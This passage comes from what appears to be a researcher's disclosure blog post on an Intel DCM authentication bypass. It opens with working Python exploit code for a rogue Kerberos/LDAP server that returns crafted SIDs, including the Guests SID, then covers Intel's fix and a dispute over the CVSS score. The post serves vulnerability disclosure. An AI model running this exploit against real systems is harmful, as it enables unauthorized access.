  asRep['ticket']['enc-part']['cipher'] = binascii.unhexlify("3dbe1e264dc1c7c3c4fc619efbfb49ee8c10b76d6c312d10aab3d7e6b00ccbaa9d3b9ed706d79d9124920b36b07e67dbe709806a24b9edc12ed40f5cd835c14369763468008863ba7af2d94196de1e89d06bb58bad7dab97cc7a107818983546e9c0d9c115722f38207ad8ea94afdebc9b42326f2fd14a9b629f970617d9ac15009fcabd99c89471eb91fc8b07efadbcc6fb0d6af813ca452481d5ee6c530a0a54bdeacd96f2913adcbca80ab62396ce8f8734bf18c582035ac614257c41fec115989d73e8ef5587b1cadcb184694dd3c3cee1cb8d0e0b8019f9444f0de31bf4c2acbaecd4935ddb40cbe9ad34376289e4a82757f013f9686165e7b02846f162bae705ca02429068dd5b2f450e36a94b27f7cd30c36537fbbedaea6ee00431b7c8fbdda5cdf943790e9b82c59c95b95f9de7d6639bdba0c3dadf3b3bd4a207386bb9cfa06e539656d57796a8e28ddecca94af04348e3edb1833721c17fe4040ab4975a41a1a40ae67e87d00740c417cd7d915e2185c66861e32648489227b9e344c27c3290d67c9c8cb507646c77ef0fdbc7d527802b11b693b6cd12f393d5c9737ed1dead9fa769994b7c0c753d17f676b767334e898f52f496e6f4f46f57592d291f3425e5bb12fa02b352989dacc3746d1ef1690bb6c8b61cefb5560bdcf956af1b975c838df6d65118aa7306e39f3076780b4b450cf88b39e75fb13fa325e82cede2e9bab8eba0e0a5da73806eb174c85001240b2df27c5f732ca17943b6be6153e1c871ddd3c0fab49bca9d1218e5014a70c73399817efe7016df206ad42643e478656a700709f654f161366057c2fcdc61030b3c6ff562e5b702224d3720153b32f92c1c86f6500df17f5cce3b7d762a31fea8cc0ffb80062c36f46be5d0905c170ebf46d78cc7dc0644ca72ed01f8b561980de786441b595941fe5b3fde09b7945780d5fbf175bdd7512708af481dc1bac50d845b869b5afaf71de31efd0856df5b1283511537057618fd6251cacd8796723c4a7456fd180c04c2e87cc74e073e6e9992936e98aec4216e6a2da5423204f3a4c9853b0ce7d10847d898b5ba7c6a2c0a38f545da25410c9e94bb63d992850ef54733056ceec9e3a7256a935df1aee76000e0e388826c48c769c21f1767ffa468438a76d91c8ad152368a91c07512b6b4b0f6dfafbdeb3e2e15d3ea6e1aa9f5cfab0b0299bc100e38f1e40c8b3e0c993303a728ec4e21467492e56b64e489a2da387a80c432d04a58d05c27609a9ce085935417f3b219fc9bffc47433611ee50502911467ea843eef815c3f2593c12fd126228bcb0d57c7220f7e70719ab011f5b650f91540984d9c78dbf72852e836d833c5cc7b265311b593cf1d5b6c523829e74b3f939c291b7ceff9231e2cb39f035e3d44dfc720510b3bffdf12fb9090b03acdaa9f04295dc62d3d110e92461fcf66a0aa36543f2cc38114de298e3b6d9c40d283677a6cf2246860a931")
  
  asRep['enc-part'] = noValue
  asRep['enc-part']['etype'] = constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
  asRep['enc-part']['kvno'] = 2
  asRep['enc-part']['cipher'] = final
  
  encodedASREP = encoder.encode(asRep, asn1Spec=AS_REP())
  
  # We need to prepend the packet with its length
  lenOfASREP = struct.pack('>I', len(encodedASREP))
  
  final_payload = lenOfASREP + encodedASREP
  
  conn.send(final_payload)
  print("[+] Kerberos AS_REP sent!")
  
  s.close()
  break
  
  def SearchResultDone_request(messageID):
  srd = SearchResultDone()
  srd['resultCode'] = ResultCode('success')
  srd['matchedDN'] = ''
  srd['diagnosticMessage'] = ''
  msg = LDAPMessage()
  msg['messageID'] = MessageID(messageID)
  msg['protocolOp'] = ProtocolOp().setComponentByName('searchResDone', srd)
  return srd
  
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((listen_ip, 389))
  s.listen()
  conn, address = s.accept()
  
  with conn:
  print("[+] Received LDAP connection from {}".format(address))
  while True:
  r = conn.recv(2048)
  
  # First get the messageId
  ldap_resp, _ = decoder.decode(r, asn1Spec=LDAPMessage())
  messageID = ldap_resp['messageID']
  
  if messageID == 1:
  print("[+] Sending successful bindResponse")
  res = BindResponse()
  res['resultCode'] = ResultCode('success')
  res['matchedDN'] = ''
  res['diagnosticMessage'] = ''
  
  msg = LDAPMessage()
  msg['messageID'] = MessageID(messageID)
  msg['protocolOp'] = ProtocolOp().setComponentByName('bindResponse', res)
  data = encode(msg)
  conn.send(data)
  
  elif messageID == 2:
  print("[+] Sending searchResEntry results #1 to return invalid user SID to reach the vulnerable code branch")
  res = SearchResultEntry()
  res['object'] = LDAPDN('CN=mrtuxracer,CN=Users,DC=hack,DC=local')
  
  res['attributes'] = PartialAttributeList()
  res['attributes'][0] = PartialAttribute()
  res['attributes'][0]['type'] = AttributeDescription('objectSid')
  res['attributes'][0]['vals'] = Vals()
  # translates to SID S-1-5-4294967295-4294967295-4294967295-4294967295-4294967295
  res['attributes'][0]['vals'][0] = AttributeValue(b'\x01\x05\x00\x00\x00\x00\x00\x05\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff')
  
  msg1 = LDAPMessage()
  msg1['messageID'] = MessageID(messageID)
  msg1['protocolOp'] = ProtocolOp().setComponentByName('searchResEntry', res)
  
  res = SearchResultReference()
  res.setComponentByPosition(0, 'ldap://hack.local/CN=Configuration,DC=hack,DC=local')
  msg2 = LDAPMessage()
  msg2['messageID'] = MessageID(messageID)
  msg2['protocolOp'] = ProtocolOp().setComponentByName('searchResRef', res)
  
  # Let's put the LDAPMessages together
  data = encode(msg1) + encode(msg2) + encode(SearchResultDone_request(messageID))
  conn.send(data)
  elif messageID == 3:
  print("[+] Sending searchResEntry results #2 returning a dummy user record")
  res = SearchResultEntry()
  res['object'] = LDAPDN('CN=mrtuxracer,CN=Users,DC=hack,DC=local')
  
  res['attributes'] = PartialAttributeList()
  res['attributes'][0] = PartialAttribute()
  res['attributes'][0]['type'] = AttributeDescription('distinguishedName')
  res['attributes'][0]['vals'] = Vals()
  res['attributes'][0]['vals'][0] = AttributeValue('CN=mrtuxracer,CN=Users,DC=hack,DC=local')
  msg1 = LDAPMessage()
  msg1['messageID'] = MessageID(messageID)
  msg1['protocolOp'] = ProtocolOp().setComponentByName('searchResEntry', res)
  
  # Let's put the LDAPMessages together
  data = encode(msg1) + encode(SearchResultDone_request(messageID))
  conn.send(data)
  elif messageID == 4:
  print("[+] Sending searchResEntry results #3 exploiting the well-known 'Guests' SID")
  # Returns SIDs S-1-5-32-546 (Guests), S-1-5-32-545 (Users) and a random SID for Domain Users
  res = SearchResultEntry()
  res['object'] = LDAPDN('CN=mrtuxracer,CN=Users,DC=hack,DC=local')
  
  res['attributes'] = PartialAttributeList()
  res['attributes'][0] = PartialAttribute()
  res['attributes'][0]['type'] = AttributeDescription('tokenGroups')
  res['attributes'][0]['vals'] = Vals()
  res['attributes'][0]['vals'][0] = AttributeValue(
  b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x22\x02\x00\x00') # S-1-5-32-546 (Guests)
  res['attributes'][0]['vals'][1] = AttributeValue(
  b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00') # S-1-5-32-545 (Users)
  res['attributes'][0]['vals'][2] = AttributeValue(
  b'\x01\x05\x00\x00\x00\x00\x00\x05\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff') # random sid
  msg1 = LDAPMessage()
  msg1['messageID'] = MessageID(messageID)
  msg1['protocolOp'] = ProtocolOp().setComponentByName('searchResEntry', res)
  
  # Let's put the LDAPMessages together
  data = encode(msg1) + encode(SearchResultDone_request(messageID))
  conn.send(data)
  
  print("[+] Exploit done. Enjoy your access :-)")
  s.close()
  exit(0)
  

Here’s the exploit in action:

## Intel’s Fix

Intel has fixed this issue by enforcing LDAPS and performing an additional certificate check against DCM’s internal SSL keystore, where the Active Directory CA certificate needs to be trusted, starting from version 5.0 of DCM.

## About Intel’s CVSS (Mis)Interpretation

I initially reported this bug to [Intel’s bug bounty program](https://app.intigriti.com/researcher/programs/intel/intel/detail) . It is essential to mention that they state in [their program policy](https://app.intigriti.com/researcher/programs/intel/intel/detail) that they are using CVSS to estimate the impact of a vulnerability, which means they should follow the official CVSS definition, right?

Well, not so much. Intel downgraded this issue to a 8.8 at [CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H) and also mentions this in their security advisory [INTEL-SA-00713](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) . Are you curious why [my official advisory](https://raw.githubusercontent.com/MrTuxracer/advisories/master/CVEs/CVE-2022-33942.txt) rates this issue at 10.0 ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) ) instead?

### AV:A vs AV:N

Intel thinks that “DCM is an enterprise application and was developed for administrative networks”, which is their excuse to downgrade the AV vector. I confronted them with the official [CVSS specification document](https://www.first.org/cvss/v3.1/specification-document) , which defines the `Adjacent` value as follows:

> The vulnerable component is bound to the network stack, but the attack is limited at the protocol level to a logically adjacent topology. This can mean an attack must be launched from the same shared physical (e.g., Bluetooth or IEEE 802.11) or logical (e.g., local IP subnet) network, or from within a secure or otherwise limited administrative domain (e.g., MPLS, secure VPN to an administrative network zone). One example of an Adjacent attack would be an ARP (IPv4) or neighbor discovery (IPv6) flood leading to a denial of service on the local LAN segment (e.g., CVE‑2013‑6014).

While the vulnerable component is indeed bound to the network stack, it is **NOT** limited at the protocol level - they don’t even enforce any iptables rules or similar to force it to be adjacent-like. Therefore AV must be set to N.

### UI:R vs. UI:N

Intel also thinks that `UI:R` applies because an Administrator has to configure DCM in a way that allows authentication for an Active Directory group with a well-known SID.

However, the [CVSS specification document](https://www.first.org/cvss/v3.1/specification-document) explicitly mentions this configuration change condition under the **Attack Complexity** vector:

> If a specific configuration is required for an attack to succeed, the Base metrics should be scored assuming the vulnerable component is in that configuration. 

This essentially means the UI vector should stay untouched at UI:N, and the AC vector must be set to the base metric at AC:L.

### Consequences

Intel made a one-time exception and rewarded $10,000 for this bug, which is great, but it also was an exhausting fight to get to this point.

It is crucial for hackers and bug bounty programs to have a common baseline for impact measurement and discussion based thereon. I also acknowledge that there is a bit of play space regarding CVSS interpretation, but fundamentally ignoring core definitions of the underlying framework essentially means breaking trust with hackers.

## Update 24-03-2023

[Intel finally updated the CVSS](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [s](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [c](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [o](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [r](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [e](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) [of this bug to 10.0 turning it into a critical.](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html)
